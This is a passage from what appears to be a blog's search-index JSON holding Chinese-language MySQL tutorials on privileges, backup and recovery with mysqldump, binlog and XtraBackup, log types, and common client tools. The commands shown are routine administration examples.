databases权限的用户执行show databases语句，","path":"2019/10/10/MySQL-权限与安全/","date":"10-10","excerpt":"MySQL权限管理权限系统的工作原理权限系统分为两个阶段 对连接的用户进行身份认证，合法的用户通过认证，不合法的用户拒绝连接 身份认证是通过IP地址和用户名联合进行验证。例如root@localhost，只能接受root以localhost登陆，其他的地址登陆都将拒绝，就算用户名相同，但是IP不同，也会认为非同一个用户 对通过认证的合法用户赋予相对应的权限，用户可以在这些权限范围内对数据库做相应的操作 mysql的权限表在数据库启动的时候就载入内存，当用户通过身份认证后，就在内存中进行相应的权限的存取","tags":[]},{"title":"MySQL-备份与恢复","text":"备份/恢复策略 确定需要备份的表的存储引擎是事务型还是非事物型，两种不同的存储引擎备份方式在处理数据一直性方面是不太一样的 确定使用全备份还是增量备份，全备份的优点是备份保持最新，恢复的时候可以花费更少的时间，缺点是如果数据量大，将会花费很多时间，对系统造成较长时间的压力。增量备份只需要备份每天的增量日志，备份时间少，对负载压力也小，但是恢复的时候需要全备份加上次备份到故障前的所有日志，恢复时间会长一些 可以考虑采取复制的方法来做异地备份，但是复制不能代替备份，它对数据库的错误操作也无能为力 要定期做备份，备份的周期要充分考虑系统可以承受的恢复时间，备份要在系统负载较小的时候进行 确保MySQL打开log-bin选项，有了BINLOG，MySQL才可以在必要的时候做完整恢复，或基于时间点的恢复，或基于位置的恢复 要经常做备份恢复测试，确保备份是有效的，并且是可以恢复的 逻辑备份和恢复备份逻辑备份是将数据中的数据备份为一个文本文件，备份的文件可以被查看和编辑。在MySQL中可以使用mysqldump工具来完成逻辑备份。 12345678# 备份指定的数据库或者此数据库中的某些表mysqldump [options] db_name [tables]# 备份指定的一个或多个数据库mysqldump [options] --database DB1 [DB2 DB3...]# 备份所有数据库mysqldump [options] --all-database 如果没有指定数据中的任何表，默认导出所有数据库中的所有表 12345678910111213141516171819202122232425262728# 导出时可能会出现 ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement错误# secure_file_priv参数用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。# secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。# secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。# secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。# 查询secure_file_priv show global variables like '%secure_file_priv%';# 因为secure_file_priv只是可读参数，所以只能在配置文件中更改# 添加参数 secure_file_priv=''# 备份所有数据库mysqldump -u root -p --all-database &gt; all.sql# 备份数据库test# -l参数表示给所有表加读锁，-F表示生成一个新的日志文件mysqldump -u root -p -l -F test &gt; test.sql# 备份数据库test下的表empmysqldump -u root -p test emp &gt; emp.sql# 备份数据库test下的emp和deptmysqldump -u root -p test emp dept &gt; emp_dept.sql# 备份数据库test下t1,t2表为逗号分隔的文本，备份到/tmpmysqldump -u root -T /tmp test t1 t2 --fields-terminated-by ',' 完全恢复1234567891011# 备份文件生成# -l参数表示给所有表加读锁，-F表示生成一个新的日志文件mysqldump -u root -p -l -F test &gt; test.sql# 备份完成后产生了新的数据，并且日志写入了新的文件# 恢复备份时的日志数据mysql -u root -p dbname &lt; bakfile# 备份后的数据并不完整，还需要将备份后生成的新的日志进行重做mysqlbinlog binlog-file | mysql -u root -p 基于时间点恢复如果删除一张表是无法使用完全恢复的， 因为日志中还存在了误操作的语句，实际需要的是恢复到错误操作之前的状态，跳过错误的操作语句，再恢复后面执行的语句 1234567# 如果错误操作的时间是十点整# 1. 恢复故障前的数据mysqlbinlog --stop-date=\"2019-10-08 09:59:59\" /var/log/mysql/bin.000001 | mysql -u root -p# 2. 跳过故障时间点，继续恢复后面的binlogmysqlbinlog --start-date=\"2019-10-08 10:00:01\" /var/log/mysql/bin.000001 | mysql -u root -p 基于位置恢复基于位置恢复更加精确 1234567# 截取错误操作时间点数据mysqlbinlog --start-date=\"2019-10-08 10:00:00\" --stop-date=\"2019-10-08 10:05:00\" /var/log/mysql/bin.000001 &gt; 1.sql# 通过位置号跳过错误命令(错误位置号368313、368314)mysqlbinlog --stop-position=\"368312\" /var/log/mysql/bin.000001 | mysql -u root -pmysqlbinlog --start-position=\"368315\" /var/log/mysql/bin.000001 | mysql -u root -p 物理备份与恢复冷备份 停掉MySQL服务，在操作系统级别备份MySQL的数据文件和日志文件到备份目录 将备份的数据文件和日志文件放置到需要还原的数据库目录，重启MySQL使用mysqlbinlog工具恢复自备份以来的所有binlog 热备份MyISAM热备份需要将备份的表添加读锁，然后再cp数据文件到备份目录 使用mysqlhotcopy工具 1mysqlhotcopy db_name [/path] 手工锁表copy 1234# 将所有表加锁flush tables for read;# 通过cp命令复制数据文件 InnoDB热备份可以使用ibbackup工具或者Xtrabackup工具 Xtrabackup工具氛围xtrabackup和innobackupex，前者只能备份InnoDB和XtraDB两种表，而不能备份MyISAM表，而后者是分装了xtrabackup的Perl脚本，支持同时备份InnoDB和MyISAM，但是进行MyISAM备份时需要加一个全局的读锁 全量备份 start xtrabackup_log:备份时会开启一个后台进程监控mysql redo的变化，一旦发现redo中有新的日志写入，立刻将日志记入后台日志文件xtrabackup_log中。 copy .ibd, ibdatal：复制InnoDB的数据文件和系统表空间文件ibdatal flush tables with read lock;：恢复结束后执行锁操作，防止发生DDL操作 copy .frm;MYD;MYI;misc;files：复制.frm .MYI .MYD等文件 Get binary log position：获得binlog的文职 unlock tables; ： 解锁 stop and copy xtrabackup_log ： 结束备份 全备恢复 启动XtraBackup内嵌InnoDB实例，读取数据文件中的信息到内存中。 从xtrabackup_log中恢复信息 将事物信息变更应用到InnoDB数据表空间，同时回滚未提交的事物 在备份期间(copy数据时)事务存在不一致，即copy开始时，有些事务已开始，有些刚刚开始，而copy结束前或结束后才提交或回滚。 这些不确定的事务需要在恢复前来确定最终是否最终提交或回滚。在这个阶段的操作称之为prepare阶段。 这个prepare阶段依赖于备份时的xtrabackup log(来自innodb logfile)，使用–apply-log参数实现一致性。 –apply-log参数会根据xtrabackup log做相应的前滚或回滚，完成后会重建innodb logfile文件。 增量备份增量备份只针对InnoDB而言，对MyISAM等引擎还是全拷贝。 增量备份主要是通过拷贝InnoDB中有变更的页（这些变更的数据页指的是“页”的LSN大雨xtrabackup-checkpoints中给定的LSN）。增量备份是基于全备的，第一次增备的数据必须要给予上一次的全备，之后的每次增倍都是基于上一次的增倍，最终达到一致性的增备。 start xtrabackup_log`:备份时会开启一个后台进程监控mysql redo的变化，一旦发现redo中有新的日志写入，立刻将日志记入后台日志文件xtrabackup_log中。 copy pages changes .ibd, ibdatal：复制InnoDB的数据文件和系统表空间文件ibdatal中修改过的页 flush tables with read lock;：恢复结束后执行锁操作，防止发生DDL操作 copy .frm;MYD;MYI;misc;files：复制.frm .MYI .MYD等文件 Get binary log position：获得binlog的文职 unlock tables; ： 解锁 stop and copy xtrabackup_log ： 结束备份 增量备份恢复增量备份需要全备份、增量备份和xtrabackup_log数据文件内恢复，然后对未提交事物的回滚 graph LR A(增量备份)-->|应用改变的数据页|B(全备份) C(xtrabackup_log)-->|应用日志|B F(xtrabackup_log)-->|应用日志|E(全备份+增备) D(undo space)-->|回滚未提交的数据|E innobackupex使用 安装innobacupex 123456# 从https://www.percona.com/downloads/下载Percona XtraBackupwget -C https://www.percona.com/downloads/Percona-XtraBackup-2.2/Percona-XtraBackup-2.2.11/binary/tarball/percona-xtrabackup-2.2.11-Linux-x86_64.tar.gztar xvzf percona-xtrabackup-2.2.11-Linux-x86_64.tar.gzcd percona-xtrabackup-2.2.11-Linux-x86_64mv percona-xtrabackup-2.2.11-Linux-x86_64 /usr/local/xtrabackupexport PATH=/usr/local/xtrabackup/bin/:$PATH 全量备份 创建备份用户 12create user 'backup'@'%' identified by '123456';grant reload, lock tables, replication client, create tablespace, super on *.* to 'backup'@'%'; 定义备份路径mkdir -p /data/backup/hotbackup/,创建innobackupex的配置文件/tmp/my.cnf 1234567[mysqld]datadir=&quot;/home/mysql_test/mysqlhome/data&quot;innodb_data_home_dir=&quot;/home/mysql_test/mysqlhome/data1&quot;innodb_data_file_path=&quot;ibdata1:10M:autoextend&quot;innodb_log_group_home_dir=&quot;/home/mysql_test/mysqlhome/data/&quot;innodb_log_files_in_group=2innodb_log_file_size=536870912 进行全备份 1innobackupex --user=backup --password=123456 --socket=/tmp/mysql_test.sock --defaults-file=/tmp/my.cnf /data/backup/hotbackup/full --no-timestamp 恢复全备(回放事务日志) 1innobackupex --apply-log --use-memory=20G /data/backup/hotbackup/full 恢复全备(复制文件) 1234567891011121314# 关闭数据库mysqladmin -S /tmp/mysql_test.sock shut# 重命名原数据库文件目录mv /home/mysql_test/mysqlhome/data /home/mysql_test/mysqlhome/data_bak# 创建一个新的数据文件目录mkdir /home/mysql_test/mysqlhome/data# 将备份数据复制到新的数据文件目录下innobackupex --defaults-file=/tmp/my.cnf --copy-back --rsync /data/backup/hotbackup/full/# 赋权chown -R mysql_test:mysql_test /home/mysql_test/mysqlhome/data# 启动数据库cd /home/mysql_test/mysqlhome./bin/mysqld_safe -user=mysql &amp; 增量备份 增量备份之前需要进行一次全量备份 创建增量备份incremental_one 1innobackupex --user=backup --password=123456 --socket=/tmp/mysql_test.sock --defaults-file=/tmp/my.cnf --incremental /data/backup/hotbackup/incremental_one --incremental-basedir=/data/backup/hotbackup/base --no-timestamp --parallel=2 增量备份恢复 恢复基础备份（全备） 12# 一定要加上redo-only参数，该参数可以只应用xtrabackup日志中已经提交的事务数据，不回滚还未提交的数据innobackupex --apply-log --redo-only --use-memory=20G /data/backup/hotbackup/base 恢复增量备份到基础备份（开始恢复的增量备份要添加–redo-only参数，到做后一次增量备份要去掉–redo-only参数） 1innobackupex --apply-log [--redo-only(最后一次增量备份去掉)] --use-memory=20G /data/backup/hotbackup/base --incremental-dir=/data/backup/hotbackup/incremental_one/ 对整体的基础备份进行回复，回滚那些未提交的数据 123456789101112131415161718# 把所有合在一起的基础备份整体进行一次apply操作，回滚未提交的数据innobackupex --apply-log --use-memory=20G /data/backup/hotbackup/base# 把恢复完的备份复制到数据文件目录中，赋权# 关闭数据库mysqladmin -S /tmp/mysql_test.sock shut# 重命名原数据库文件目录mv /home/mysql_test/mysqlhome/data /home/mysql_test/mysqlhome/data_bak# 创建一个新的数据文件目录mkdir /home/mysql_test/mysqlhome/data# 将备份数据复制到新的数据文件目录下innobackupex --defaults-file=/tmp/my.cnf --copy-back --rsync /data/backup/hotbackup/full/# 赋权chown -R mysql_test:mysql_test /home/mysql_test/mysqlhome/data# 启动数据库cd /home/mysql_test/mysqlhome./bin/mysqld_safe -user=mysql &amp; 不完全恢复 12345678910111213# 找到记录备份结束时刻的binlog的位置文件cat xtrabackup_binlog_info#mysql-bin.000001 516847# 查看当前数据库的binlog文件和位置show master logs#mysql-bin.000001 516840# 从全备中恢复数据库，恢复全备，之后再从热备结束时刻binlog的位置开始，恢复到误操作时刻10:00之前的binlogmysqlbinlog --start-position=\"516847\" --stop-datatime=\"2019-10-09 09:59:59\" /home/mysql_test/data/nysql-bin.000001 /home/mysql_test/data/mysql-bin.000002 | mysql -u root -p# 跳过故障点的误操作的时间点mysqlbinlog --start-datetime=\"2019-10-09 10:01:00\" /home/mysql_test/data/mysql-bin.000001/home/mysql_test/data/mysql-bin.000002 | mysql -u root -p 克隆slave 如果业务中从库的读取量无法满足现在的需求，就需要在线添加从库，所以应该要现在克隆slave 使用innobackupex在线克隆时需要添加–slave-info（将Master的binary log文件名和偏移位置保存到xtrabackup-slave-info文件中）和–safe-slave-backup（暂停slave的sql线程，知道没有打开的临时表的时候开始备份，待备份结束后sql线程会自动启动，这样操作主要是确保一致性的复制状态） 1234567891011121314151617181920212223242526# 在从机上进行备份， 将备份产生的文件放置到/data/backup/hotbackup/cloneslave下innobackupex --user=backup --password=123456 --socket=/tmp/mysql_test.sock --defaults-file=/tmp/my.cnf --slave-info --safe-slave-backup /data/backup/hotbackup/cloneslave --no-timestamp --parallel=2# 在从机上进行还原innobackupex --apply-log --redo-only --use-memory=20G /data/backup/hotbackup/cloneslave# 将还原的文件复制到新的从库上rzync -avprP -e ssh /data/backup/hotbackup/cloneslave newslave:/home/mysql_test/mysqlhome/data# 在主机添加新的从库的授权mysql&gt; grant replication slave on *.* to 'repl'@'slave2' indentified by '123456'# 拷贝从机的my.cnf文件，并且修改server-id擦书，修改完毕后启动新的从库scp slave:/etc/mysql/my.cnf /etc/mysql/my.cnf[mysqld]skip-slave-startserver-id=3log-slave-updates=1# 查找从库备份后生成的xtrabackup_slave_info文件，提取其中的master_log_file和master_log_pos信息，然后在新的从库上进行change master to操作change master to master_host='master',master_user='repl',master_password='123456',master_log_file='mysql-bin.000044',master_log_pos=27399;# 启动从库start slave; 表的导入导出导出在某些情况下导出的表数据可能应用于EXCEL、CSV、加速加载数据……所以需要将表数据以某些符号分割 使用select … into outfile … 命令导出数据 1234567891011121314select * from tablename into outfile 'target_file' [option]# option: # fields terminated by 'string':字段分隔符可以是字符串，默认为制表符'\\t'# fields [optionally] enclosed by 'char':字段引用符且只能是单个字符，如果加上optionally选项则只用在char、varchar和text等字符型字段上，默认不是用引用符# fields escaped by 'char':转义字符，默认'\\\\'# lines starting by 'string':每行前都加此字符串，默认' '# lines terminated by 'string':行结束符，默认'\\n'# 以','分割，字段引用符为'\"'select * from tablename into outfile '/tmp/table.txt' fields terminated by \",\" enclosed by '\"';# 当导出命令中包含字段引用符时，数据中含有转义字符本身和字段引用符的字符需要被转义# 当导出命令中不包含字段引用符时，数据中含有转义字符本身和字段分隔符的字符需要被转义# 如果目标目录下有重名文件，将创建失败 使用mysqldump导出 1234567891011mysqldump -u username -T target_dir dbname tablename [option]# option参数可选# --fields-terminated-by=name：字段分隔符# --fields-enclosed-by=name：字段引用符# --fields-optionally-enclosed-by=name：字段引用符，只用在char、varchar和text等字符型字段上# --fields-escaped-by=name：转义字符# --lines-terminated-by=name：记录结束符# 以','分割，字段引用符为'\"',除了会生成指定的txt文件外还会生成一个tablename.sql文件，里面记录了tablename的创建脚本mysqldump -u root -T /tmp dbname tablename --fields-terminated-by ',' --fields-optionally-enclosed-by '\"' 导入 将以上两种方式导出的文件进行导入 load data infile … 1234567891011121314load data [local] infile 'filename' into table tablename [option]# option参数可选# fields terminated by 'string':字段分隔符可以是字符串，默认为制表符'\\t'# fields [optionally] enclosed by 'char':字段引用符且只能是单个字符，如果加上optionally选项则只用在char、varchar和text等字符型字段上，默认不是用引用符# fields escaped by 'char':转义字符，默认'\\\\'# lines starting by 'string':每行前都加此字符串，默认' '# lines terminated by 'string':行结束符，默认'\\n'# ignore number lines:忽略输入文件中的前n行数据# (col_name_or_user_var):按照列出的字段顺序和字段数量加载数据# set col_name =expr,...:将列做一定的数值转换后再家在# 加载刚刚导出的数据文件,并且忽略前两行，并且只加载其中某列,如果严格模式选择列可能会出现错误 通过set sql_mode可以更改取消strict_trans_tables模式load data infile '/tmp/emp.txt' into table emp fields terminated by ',' enclosed by '\"' ignore 2 lines (name); 使用mysqlimport导出 12345678910111213mysqlimport -u root -p*** [--local] dbname order_tab.txt [option]# option参数可选# fields terminated by 'string':字段分隔符可以是字符串，默认为制表符'\\t'# fields [optionally] enclosed by 'char':字段引用符且只能是单个字符，如果加上optionally选项则只用在char、varchar和text等字符型字段上，默认不是用引用符# fields escaped by 'char':转义字符，默认'\\\\'# lines starting by 'string':每行前都加此字符串，默认' '# lines terminated by 'string':行结束符，默认'\\n'# ignore number lines:忽略输入文件中的前n行数据# 导入刚刚导出的数据mysqlimport -u root dbname /tmp/123.txt --fields-terminated-by=',' --fields-enclosed-by='\"' mysqldump和mysqlimport都是对select into outfile 和 load data infile的接口封装，load data infile是加载数据最快的方法 ​","path":"2019/10/08/MySQL-备份与恢复/","date":"10-08","excerpt":"备份/恢复策略 确定需要备份的表的存储引擎是事务型还是非事物型，两种不同的存储引擎备份方式在处理数据一直性方面是不太一样的 确定使用全备份还是增量备份，全备份的优点是备份保持最新，恢复的时候可以花费更少的时间，缺点是如果数据量大，将会花费很多时间，对系统造成较长时间的压力。增量备份只需要备份每天的增量日志，备份时间少，对负载压力也小，但是恢复的时候需要全备份加上次备份到故障前的所有日志，恢复时间会长一些 可以考虑采取复制的方法来做异地备份，但是复制不能代替备份，它对数据库的错误操作也无能为力 要定期做备份，备份的周期要充分考虑系统可以承受的恢复时间，备份要在系统负载较小的时候进行 确保MySQL打开log-bin选项，有了BINLOG，MySQL才可以在必要的时候做完整恢复，或基于时间点的恢复，或基于位置的恢复 要经常做备份恢复测试，确保备份是有效的，并且是可以恢复的","tags":[]},{"title":"MySQL-日志","text":"MySQL中的日志分为错误日志、二进制日志（binlog日志）、查询日志和慢查询日志。错误日志错误日志记录了当mysqld启动和停止时，以及服务器在运行过程中发生任何严重错误时相关信息。当数据库出现任何故障导致无法正常使用时，可以首先查看此日志 可以用log-error=file_name指定mysqld保存错误日志文件的位置。如果没有给定file_name将默认在DATADIR目录下使用host_name(主机名).err命名错误日志。 二进制日志二进制日志记录了所有的DDL（数据定义语句）和DML（数据操纵语句）语句，但是不包括数据查询语句。语句以时间的形式保存，它描述了数据的更改过程。 日志的位置和格式使用--log-bin=[file-name]选项启动，如果没有指定file-name则默认为主机名后面跟-bin，如果给出了文件名，但是没有包含路径，则自动生成再DATADIR目录下 二进制格式包括：STATEMENT、ROW、MIXED，通过启动服务器时添加--binlog_format参数进行设置 如果是MySQL5.7以上必须添加server-id参数，用不重复的server-id来区分服务器集群中的服务,否则会启动报错4 使用mysqlbinlog查看 12345678910mysqlbinlog file-name# 如果报错unknown variable 'default-character-set=utf8'，是因为无法识别binlog中的配置中的default-character-set=utf8这个指令。# 解决1# 在MySQL的配置/etc/my.cnf中将default-character-set=utf8 修改为 character-set-server = utf8，但是这需要重启MySQL服务，如果你的MySQL服务正在忙，那这样的代价会比较大# 解决2# 用mysqlbinlog --no-defaults file-name 命令打开 STATEMENT日志中记录的都是语句，每一条修改数据的操作都会记录在日志中。主从复制的时候，从库会将日志解析为原文本，并在从库重新执行一次。此格式记录日志清晰易读，日志量少，对IO影响小，但是在某些情况下从库会复制出错。 123456789101112# 使用mysqlbinlog查看mysqlbinlog --no-defaults log-bin.000001#************** 部分日志内容 *************##################################################################################SET INSERT_ID=1/*!*/;#191008 11:33:12 server id 123454 end_log_pos 672 CRC32 0x270100ba Query thread_id=2 exec_time=1 error_code=0SET TIMESTAMP=1570505592/*!*/;# 执行的语句insert into t1(name) values(\"1\") ROWrow将每一行的变更记录到日志中，而不是记录sql语句。比如一个UPDATE命令如果是STATEMENT只会记录一行，但是ROW会将全表进行变更的部分进行记录。ROW会记录每一行数据的变化细节，不会出现某些情况下无法复制的现象，但是日志长得快 并且查看执行的sql时 干扰语句多、生成sql的编码需要解码 ，对IO影响大 12345678910111213141516171819202122232425262728# 使用mysqlbinlog查看 必须添加-v参数进行转码，否则将只能看到base64的数据mysqlbinlog --no-defaults log-bin.000001# ************* 执行一条update涉及到3条记录的变更记录的日志 *************# ***************************************************# ***************************************************#191008 11:40:50 server id 123454 end_log_pos 1105 CRC32 0x038c3966 Update_rows: table id 111 flags: STMT_END_F### UPDATE `test`.`t1`### WHERE### @1=1### @2='1'### SET### @1=1### @2='2'### UPDATE `test`.`t1`### WHERE### @1=2### @2='1'### SET### @1=2### @2='2'### UPDATE `test`.`t1`### WHERE### @1=3### @2='1'### SET### @1=3### @2='2' MIXEDMySQL默认使用此模式，混合了STATEMENT和ROW两种日志。默认情况下使用STATEMENT，但在一些特殊情况下采用ROW来进行记录（采用NDB存储引擎时使用ROW存储所有的DML语句；客户端使用临时表；采用了不确定函数current_user等，因为这种不确定函数在主从中得到的值可能不同，导致住从数据长生不一致） MIXED能够尽量利用两种模式的优点，而避开他们的缺点，同时global和session级别对binlog_format进行设置，但是要确保从库能够正常进行复制 1234567891011121314151617181920212223242526272829303132333435# 使用update t1 set name=current_user() where name=\"2\";修改数据， 其中使用了current_user()函数，所以使用row格式记录#******************************************#******************************************#191008 15:46:59 server id 123454 end_log_pos 1480 CRC32 0x6a1067bd Update_rows: table id 212 flags: STMT_END_F### UPDATE `test`.`t1`### WHERE### @1=1### @2='2'### SET### @1=1### @2='root@localhost'### UPDATE `test`.`t1`### WHERE### @1=2### @2='2'### SET### @1=2### @2='root@localhost'### UPDATE `test`.`t1`### WHERE### @1=3### @2='2'### SET### @1=3### @2='root@localhost'# at 1480#191008 15:46:59 server id 123454 end_log_pos 1511 CRC32 0xcf5a150e Xid = 115COMMIT/*!*/;...SET TIMESTAMP=1570520883/*!*/;# 普通的操作使用STATEMENT记录insert into t1(name) values(\"1\"),(\"1\"),(\"1\") 日志的删除 RESET MASTER清除日志 purge master logs to &#39;file-name.id&#39;;除了id这个日志之外删除之前的所有日志 purge master logs before &#39;yyyy-mm-dd hh:mm:ss&#39;;删除这个时间之前创建的所有日志 设置日志过期时间expire_logs_days=#,指定启动后#天后日志将会自动删除，以免过多的管理上面的删除操作 其他配置参数 指定数据库操作 binlog-do-db=db_name：如果use指定的数据库是db_name则将数据修改命令写入到二进制日志中，其他没有显示指定的操作将被忽略不记录在日志中 binlog-ignore-db=db_name：如果use指定的数据库是db_name则将被忽略不记录在日志中，其他没有显示指定的操作将数据修改命令写入到二进制日志中 指定存盘策略 sync_binlog=1 or N: 默认情况下，并不是每次写入时都将binlog与硬盘同步。因此如果操作系统或机器(不仅仅是MySQL服务器)崩溃，有可能binlog中最后的语句丢 失了。要想防止这种情况，你可以使用sync_binlog全局变量(1是最安全的值，但也是最慢的)，使binlog在每N次binlog写入后与硬盘 同步。即使sync_binlog设置为1,出现崩溃时，也有可能表内容和binlog内容之间存在不一致性。如果使用InnoDB表，MySQL服务器 处理COMMIT语句，它将整个事务写入binlog并将事务提交到InnoDB中。如果在两次操作之间出现崩溃，重启时，事务被InnoDB回滚，但仍 然存在binlog中。可以用–innodb-safe-binlog选项来增加InnoDB表内容和binlog之间的一致性。 （在5.1之后引入了xa命令，所以innodb-safe-binlog选项失效了） SET SQL_LOG_BIN=0: 具有SUPER权限的客户端可以通过词语句禁止自己的语句记入二进制记录，这个选项在某些环境下是有用的， 但是要注意日志的不完整性和主从复制环境中造成的数据不一致 查询日志通过--general_log[={0|1}]和--general_log_file=file_name来进行控制是否开启查询日志，第一个参数用来控制是否开启查询日志（1或者不带值都代表开启， 0或者没有此参数则代表不开起），第二个参数用来控制日志文件的路径，如果没有指定路径并且没有显示指定--log-output参数，那么日志将写入DATADIR目录下，默认名称是host_name.log。参数是global类型， 可以在启动时或者系统运行时动态修改，如果想设置session级日志是否被记录则通过session中设置参数sql_log_off为on或者off控制 可以选择保存在文件或者表中，通过--log-output=value,...value进行控制，value可以是TABLE（表 general_log表， 如果是慢查询则是slow_low表）/FILE（文件）/NONE（不保存在表和文件中）的一个或者多个组合，中间用逗号进行分割。其中NONE优先级最高，如果不显示指定NONE参数，则默认输出到文件。 log日志中记录了所有数据库的操作，对于访问拼房的系统日志对系统的性能影响会比较大 慢查询日志通过设置--slow-query-log={1|0}开启慢查询，通过--slow_query_log_file=file_name指定慢查询的日志路径，如果没有给定file_name将存入DATADIR，默认名称host_name-slow.log。通过设置long_query_time可以设置慢查询的时间， 表锁定的时间不计算在内，默认的查询时间是10秒，最小为0秒，精度为微秒，可以通过show variables like &#39;long%&#39;查询long_query_time的值。同样可以通过--log-output指定日志的输出方式。但是如果要输出到表就只能精确到秒，而日志文件中可以精确到微秒。默认情况下管理语句和不使用索引进行查询的语句将不会记录到慢查询日志，通过参数--log-slow-admin-statements和log-queries-not-using-indexes开启。 慢日志可以通过查看日志文件、查看slow_log表获取信息，如果慢查询日志中记录内容过多，可以使用mysqldumpslow工具对慢查询进行分类汇总，对于SQL完全一致只是变量不一致的的语句，mysqldumpslow将会自动视为同一个语句用N代替变量，提高阅读效率。 mysqlslamysqlsla可以分析查询日志、慢查询日志、二进制日志和具有固定格式的自定义日志。可以通过mysqlsla下载安装 查询日志和慢查询日志 12mysqlsla --log-type slow LOGmysqlsla --log-type general LOG 解析二进制日志，需要先通过mysqlbinlog进行转换 1mysqlbinlog LOG | mysqlsla --log-type binary - 解析微秒日志 1mysqlsla --log-type msl LOG 解析用户自定义日志 1mysqlsla --log-type udl --udl-format FILE 除了二进制日志外，其他的类型日志不需要添加–log-type参数在正常情况下可以省略。因为mysqlsla无法判断经过标准输出后的日志类型，因此二进制日志通过mysqlbinlog解析后mysqlsla无法判断日志类型。mysqlsla的使用可以通过man mysqlsla查看。","path":"2019/09/29/MySQL-日志/","date":"09-29","excerpt":"MySQL中的日志分为错误日志、二进制日志（binlog日志）、查询日志和慢查询日志。错误日志错误日志记录了当mysqld启动和停止时，以及服务器在运行过程中发生任何严重错误时相关信息。当数据库出现任何故障导致无法正常使用时，可以首先查看此日志","tags":[]},{"title":"MySQL-常用工具","text":"客户端连接工具连接工具是数据库管理员使用的最频繁的工具即mysql命令，这个mysql不是指MySQL服务/数据库，而是指连接数据库客户端工具。1234mysql [OPTIONS] [database]# OPTIONS mysql可用项，可以写多个，也可以不写# database 链接的数据库 mysql选项中有两种表达方式’-‘加缩写字符和’–’加’=‘加完整单词例如mysql-uroot和mysql --user=root 链接选项,为缩写与单词分隔符 1234567891011121314# 这四个经常一起用。如果不带这些参数则默认使用@localhost空密码连接3306端口，如果空用户删除了，mysql会去my.cnf里找[client]组内的用户名和密码，如果有则按照此用户名和密码进行登录，如果没有记录此选项，则系统会使用root@localhost用户进行登录-u, --user= 指定用户名-p, --password[=name] 指定密码-h, --host=name 指定服务器ip或者域名-P, --port=# 指定连接端口# 配置文件里面记录登录用户[client]user=rootpasswrod=123456# 查看当前的连接用户select current_user(); 客户端字符集选项可以在配置文件中设置客户端字符集，当mysql工具连接数据库的时候就会自动使用设置中的字符集 1234567# 可以写入mysqld组中[mysqld]default-character-set=charset-name# 也可以写在mysql组中[mysql]default-character-set=charset-name 也可以在mysql的命令行中手工指定客户端字符集 1234567891011# 登录的时候指定字符集mysql -u user default-character-set=charset-name# 登录后执行命令指定字符集# 登录mysql -u user# 设置字符集set name charset;# 查看连接到MySQL服务后的客户端字符集show variables like 'chara%'; 执行选项-e选项可以直接在MySQL客户端执行SQL语句，而不用连接到MySQL数据库后再执行，对于一些批处理脚本这种方式非常方便。 12345# 执行SQL语句并退出-e, --execute=name# 可以执行多个语句通过`;`隔开mysql -u user -p -e &quot;select * from t; select count(1) from t;&quot; 格式化选项1234567# 将输出方式按照字段顺序竖着显示# -E 类似于mysql里面执行SQL语句后加&apos;\\G&apos;-E, --vertical # 去掉mysql中的线条框显示# 去除线条后，字段之间用tab进行分隔-s, --silent 错误处理选项12345678# 强制执行SQL-f, --force# 显示更多信息-v, --verbose# 显示警告信息--show-warnings 在批量执行SQL时，如果其中一个SQL执行出错，正常情况下，该批处理停止退出。加上-f选项，则跳出错过SQL，强制执行后面的SQL；加上-v选项，则显示出错的SQL语句，加上--show-warnings，则会显示全部错误信息。如果这三个参数一起使用会对用户很有帮助。如果数据中有语法错误的地方，则会将出错信息记录在日志中，而不会停止使得后面的正常SQL无法执行；而出错的语句，也可以在日志中得以查看，进行修复。 MyISAM表压缩工具myisampack是表压缩工具，压缩后的表将变成一个只读表，不能进行DML操作 12345# 进入mysql数据文件夹cd /var/lib/mysql/test# 对数据表t进行压缩myisampack t MySQL管理工具mysqladmin是一个执行管理操作的客户端程序。可以用它来检查服务器的配置和当前的状态、创建并删除数据库等。 mysqladmin和mysql客户端连接的使用非常相似，但是更加侧重于对管理的功能 1234567891011121314151617181920212223242526# 使用方式mysqladmin -u user -p [command]# commandcreate database # 创建一个新的数据库debug # 命令服务器将debug的信息写入日志文件drop database # 删除数据库extended-status # 提供来自服务器的扩展状态消息flush-hosts # 刷新所有的host缓存flush-logs # 刷新所有的日志flush-status # 清除状态变量flush-tables # 刷新所有的表flush-threads # 刷新线程缓存flush-privileges # 重新加载授权表（与重新加载相同）kill id, id,..... # 杀掉mysql的线程password new-password # 更改用户密码ping # 检查mysql是否还存活processlist # 显示服务器中活动线程的列表reload # 重新加载授权表refresh # 刷新所有表并关闭和打开日志文件shutdown # 关闭数据库status # 提供来自服务器的简短状态消息start-slave # 开启从服务器stop-slave # 关闭从服务器variables # 打印可用变量version # 获取mysql的数据库版本信息 日志管理工具因为服务器生成的二进制日志文件，如果要检查这些文件的文本格式，就需要用到mysqlbinlog 12345678910mysqlbinlog [options] log-file1, log-file2...# option有很多选项-d, --database=name:指定数据库名称，只列出指定的数据库相关操作-o, --ofset=#: 忽略日志中的前n行命令-r, --result-file=name: 将输出的文本格式日志输出到指定文件-s， --short-from： 显示简单格式，省略掉一些信息--set-charset=char-name： 在输出为文本格式时，在文件第一行加上set names char-name，可以用来加载数据--start-datetime=name --stop-datetime=name：指定日期间隔内的所有日志--start-position=# --stop-position=#： 指定位置间隔内的所有日志 MyISAM表维护工具mysqlcheck客户端工具可以检查和修复MyISAM表，还可以优化和分析表 123456789mysqlcheck [options] db_name [tables]mysqlcheck [options] --database DB1 [DB2 DB3]mysqlcheck [options] --all-database# options有以下选项-c, --check(检查表) 默认选项-r, --repair(修复表)-a, --analyze(分析表)-o, --optimize(优化表) 数据导出工具mysqldump客户端工具用来备份数据库或在不同数据库之间进行数据迁移。 1234567891011# 备份单个数据库或者库中部分数据表mysqldump [options] db_name [tables]# 备份指定的一个或者多个数据库mysqldump [options] --database DB1 [DB2 DB3...]# 备份所有数据库mysqldump [options] --all-database# 导出数据mysqldump -h host -P port -u user -p test &gt; test.txt 输出内容选项1234567891011121314# 每个数据库创建语句前加上DROP DATABASE语句--add-drop-database # 每个表创建语句前加上DROP TABLE语句--add-drop-table# 不包含数据库的创建语句-n, --no-create-db# 不包含数据表的创建语句-t, --no-create-info# 不包含数据-d, --no-data 